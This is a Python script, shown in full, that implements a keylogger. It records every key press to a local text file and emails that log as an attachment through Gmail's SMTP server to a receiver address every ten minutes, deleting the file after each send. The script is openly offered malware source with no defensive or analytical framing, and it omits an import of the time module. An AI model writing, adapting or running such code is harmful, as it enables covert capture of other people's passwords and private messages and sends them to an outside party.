import keyboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os

def start_keylogger():
    # Ask for email information
    sender_email = input("Enter the sender email address: ")
    sender_password = input("Enter the sender email password: ")
    receiver_email = input("Enter the receiver email address: ")

    # Set up the SMTP server
    smtp_server = "smtp.gmail.com"
    smtp_port = 587

    # Create a MIMEMultipart message
    msg = MIMEMultipart()
    msg["From"] = sender_email
    msg["To"] = receiver_email
    msg["Subject"] = "Keylogger Log"

    # Capture keystrokes
    def on_key_press(event):
        with open("keylogger_log.txt", "a") as log_file:
            log_file.write(event.name)

    # Start listening for keystrokes
    keyboard.on_press(on_key_press)

    # Send the log file to the email
    def send_log_file():
        with open("keylogger_log.txt", "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header("Content-Disposition", f"attachment; filename=keylogger_log.txt")
            msg.attach(part)

        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver_email, msg.as_string())
        server.quit()

        # Clear the log file
        os.remove("keylogger_log.txt")

    # Send the log file every 10 minutes
    while True:
        send_log_file()
        time.sleep(600)

# Start the keylogger
start_keylogger()